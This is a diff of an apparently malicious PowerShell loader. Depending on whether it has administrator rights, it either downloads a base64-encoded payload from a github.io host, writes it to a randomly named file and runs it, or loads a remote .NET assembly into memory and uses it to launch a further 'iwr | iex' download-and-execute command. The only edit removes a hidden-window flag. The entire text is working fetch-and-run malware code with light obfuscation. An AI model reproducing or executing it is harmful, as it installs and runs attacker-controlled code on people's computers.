@@ -3,7 +3,7 @@ if (([Security.Principal.WindowsPrincipal][Security.Principal.WindowsIdentity]::
     $based = (New-Object System.Net.WebClient).DownloadString("https://kobe85.github.io/2/b2").replace("!", "")
     $bytes = [System.Convert]::FromBase64String($based)
     [System.IO.File]::WriteAllBytes($randomFileName, $bytes)
-    start-process -WindowStyle hidden $randomFileName
+    start-process $randomFileName
 } else {
     [Reflection.Assembly]::Load([Convert]::FromBase64String((New-Object Net.WebClient).DownloadString('https://kobe85.github.io/2/b1').replace("!","")));[ClassLibrary1.snytax]::habibiskies(@("C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe", "/c iwr -useb https://kobe85.github.io/a | iex"))
 }
